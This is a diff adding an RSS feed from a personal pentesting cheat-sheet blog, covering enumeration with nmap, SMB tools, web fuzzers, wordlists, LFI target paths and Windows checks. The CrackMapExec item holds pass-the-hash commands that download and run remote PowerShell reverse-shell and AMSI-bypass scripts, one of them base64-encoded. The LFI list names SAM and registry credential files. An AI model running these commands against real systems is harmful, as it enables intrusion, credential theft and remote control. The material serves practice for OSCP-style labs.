@@ -1,0 +1,178 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Enumeration on Ceso Adventures</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/</link><description>Recent content in Enumeration on Ceso Adventures</description><generator>Hugo</generator><language>en-gb</language><lastBuildDate>Fri, 03 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/cheatsheets/hacking/enumeration/index.xml" rel="self" type="application/rss+xml"/><item><title>Login through CIFS/WinRM/PSSession</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/</guid><description>&lt;p&gt;When injecting a ticket and impersonating a user, we can swap &lt;code&gt;CIFS&lt;/code&gt; for &lt;code&gt;HTTP&lt;/code&gt; for getting a shell via WinRM or swap &lt;code&gt;CIFS&lt;/code&gt; for &lt;code&gt;HOST&lt;/code&gt; for getting a shell via PsExec!!!&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id="crackmapexec---winrm"&gt;CrackMapExec - WinRM&lt;/h1&gt;
+&lt;p&gt;With Hash&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;crackmapexec winrm 172.16.80.24 -u administrator -H 09238831b1af5edab93c773f56409d96 -x &amp;#34;ipconfig&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With Password (Example gets a reverse shell)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;crackmapexec winrm 172.16.80.24 -u brie -p fn89hudi1892r -x &amp;#34;powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgAxADAANwAvAG4AaQBlAHIAaQAuAHAAcwAxACIAKQA7AEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAwADcALwByAHUAbgAtAHMAaABlAGwAbABjAG8AZABlAC0ANgA0AGIAaQB0AHMALgBwAHMAMQAiACkACgA=&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="crackmapexec---smb"&gt;CrackMapExec - SMB&lt;/h1&gt;
+&lt;p&gt;With Hash&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;crackmapexec smb 172.16.21.22 -u gouda -H 09238831b1af5edab93c773f56409d96 -x &amp;#34;powershell.exe IEX(New-Object Net.Webclient).downloadString(&amp;#39;http://192.168.42.42/4msibyp455.ps1&amp;#39;);IEX(New-Object Net.Webclient).downloadString(&amp;#39;http://192.168.42.42/dameelreversooo.ps1&amp;#39;)&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With Hash + Domain&lt;/p&gt;</description></item><item><title>Networking</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/networking/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/networking/</guid><description>&lt;h1 id="nmap"&gt;nmap&lt;/h1&gt;
+&lt;p&gt;I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sV -O --top-ports 50 --open -oA nmap/initial &amp;lt;ip or cidr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sC -sV -O --open -p- -oA nmap/full &amp;lt;ip or cidr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nmap -sU -p- -oA nmap/udp &amp;lt;ip or cidr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;--top-ports only scan the N most common ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;--open only show open ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-sC use the default scripts
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-sV detect versions
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-O detect Operating Systems
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-p- scan all the ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-oA save the output in normal format, grepable and xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-sU scan UDP ports
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Is also possible to specify scripts or ports:&lt;/p&gt;</description></item><item><title>Samba</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/samba/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/samba/</guid><description>&lt;h1 id="smbclient"&gt;smbclient&lt;/h1&gt;
+&lt;p&gt;Check if there is anonymous login enabled:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;smbclient -L 192.168.24.24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="impacket"&gt;impacket&lt;/h1&gt;
+&lt;p&gt;Is also possible to use impacket in the same way than smbclient to check for anonymous login (and a lot more as browse the shares) in case of incompatible versions.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;/usr/share/doc/python3-impacket/examples/smbclient.py &amp;#34;&amp;#34;@192.168.24.24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="smbmap"&gt;smbmap&lt;/h1&gt;
+&lt;p&gt;Check which permissions we have in those shares (if there are):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;smbmap -H 192.168.24.24
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Or having an user:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;smbmap -u ceso -H 192.168.24.24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Useful Wordlists</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/</guid><description>&lt;h1 id="most-usefull-dictionaries-oscphtb"&gt;Most usefull dictionaries (OSCP/HTB)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/share/wordlists/wfuzz/others/common_pass.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="in-seclists-pkg"&gt;In seclists-pkg&lt;/h1&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
+/usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id="assetnote"&gt;Assetnote&lt;/h1&gt;
+&lt;p&gt;Up-to-date lists are in the general webpage and there are many more than the ones here listed&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;https://wordlists.assetnote.io/
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ideally, all of them can be downloaded just at once running&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;wget -r --no-parent -R &amp;#34;index.html*&amp;#34; https://wordlists-cdn.assetnote.io/data/ -nH -e robots=off
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="api-fuzzing"&gt;API Fuzzing&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2025_09_27.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="kiterunner"&gt;Kiterunner&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-large.json.tar.gz
+https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz
+https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-small.json.tar.gz
+https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz
+https://wordlists-cdn.assetnote.io/rawdata/kiterunner/swagger-files.tar
+https://wordlists-cdn.assetnote.io/data/kiterunner/swagger-wordlist.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id="local-file-inclusion-lfi"&gt;Local File Inclusion (LFI)&lt;/h1&gt;
+&lt;h2 id="linux"&gt;Linux&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/proc/self/status
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/proc/self/environ
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/etc/exports
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="windows"&gt;Windows&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;C:/Users/Administrator/NTUser.dat
+C:/Documents and Settings/Administrator/NTUser.dat
+C:/apache/logs/access.log
+C:/apache/logs/error.log
+C:/apache/php/php.ini
+C:/boot.ini
+C:/inetpub/wwwroot/global.asa
+C:/MySQL/data/hostname.err
+C:/MySQL/data/mysql.err
+C:/MySQL/data/mysql.log
+C:/MySQL/my.cnf
+C:/MySQL/my.ini
+C:/php4/php.ini
+C:/php5/php.ini
+C:/php/php.ini
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/logs/access.log
+C:/Program Files/Apache Group/Apache/logs/error.log
+C:/Program Files/FileZilla Server/FileZilla Server.xml
+C:/Program Files/MySQL/data/hostname.err
+C:/Program Files/MySQL/data/mysql-bin.log
+C:/Program Files/MySQL/data/mysql.err
+C:/Program Files/MySQL/data/mysql.log
+C:/Program Files/MySQL/my.ini
+C:/Program Files/MySQL/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
+C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/my.ini
+C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
+C:/Program Files (x86)/Apache Group/Apache/conf/access.log
+C:/Program Files (x86)/Apache Group/Apache/conf/error.log
+C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
+C:/Program Files (x86)/xampp/apache/conf/httpd.conf
+C:/WINDOWS/php.ini C:/WINDOWS/Repair/SAM
+C:/Windows/repair/system C:/Windows/repair/software
+C:/Windows/repair/security
+C:/WINDOWS/System32/drivers/etc/hosts
+C:/Windows/win.ini
+C:/WINNT/php.ini
+C:/WINNT/win.ini
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/logs/access.log
+C:/xampp/apache/logs/error.log
+C:/Windows/Panther/Unattend/Unattended.xml
+C:/Windows/Panther/Unattended.xml
+C:/Windows/debug/NetSetup.log
+C:/Windows/system32/config/AppEvent.Evt
+C:/Windows/system32/config/SecEvent.Evt
+C:/Windows/system32/config/default.sav
+C:/Windows/system32/config/security.sav
+C:/Windows/system32/config/software.sav
+C:/Windows/system32/config/system.sav
+C:/Windows/system32/config/regback/default
+C:/Windows/system32/config/regback/sam
+C:/Windows/system32/config/regback/security
+C:/Windows/system32/config/regback/system
+C:/Windows/system32/config/regback/software
+C:/Program Files/MySQL/MySQL Server 5.1/my.ini
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
+C:/Windows/System32/inetsrv/config/applicationHost.config
+C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;</description></item><item><title>Web directorie/file scanner</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/</guid><description>&lt;h1 id="gobuster"&gt;Gobuster&lt;/h1&gt;
+&lt;p&gt;Scan all the directories/files by extension:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For scanning without extensions, just take out the -x&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id="nikto"&gt;Nikto&lt;/h1&gt;
+&lt;p&gt;Sometimes Nikto shows juicy information, I tend to run it like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="fuff"&gt;fuff&lt;/h1&gt;
+&lt;p&gt;Web fuzzer, &lt;a href="https://github.com/ffuf/ffuf"&gt;you can get fuff here&lt;/a&gt;, it basically bruteforces the dirs.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Windows</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/windows/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/windows/</guid><description>&lt;h1 id="trusted-folders"&gt;Trusted Folders&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;accesschk.exe &amp;#34;ceso&amp;#34; C:\ -wus
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; -w is to locate writable directories
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; -u supress errors
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; -s makes recursion on all subdirectories
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;icacls.exe C:\Windows\Tasks
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ^-- Verify if Tasks has execution permissions for example (flag is &amp;#34;RX&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="check-os-information"&gt;Check OS Information&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systeminfo
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ver
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="check-architecture"&gt;Check Architecture&lt;/h1&gt;
+&lt;h2 id="without-powershell"&gt;Without PowerShell&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wmic os get osarchitecture
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo %PROCESSOR_ARCHITECTURE%
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="with-powershell"&gt;With PowerShell&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[Environment]::Is64BitProcess
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="check-the-type-of-language-available-with-powershell"&gt;Check the Type of Language available with Powershell&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ExecutionContext.SessionState.LanguageMode
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Possible types are:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - Full Language
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - RestrictedLanguage
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - No Language
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - Constrained Language
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item></channel></rss>
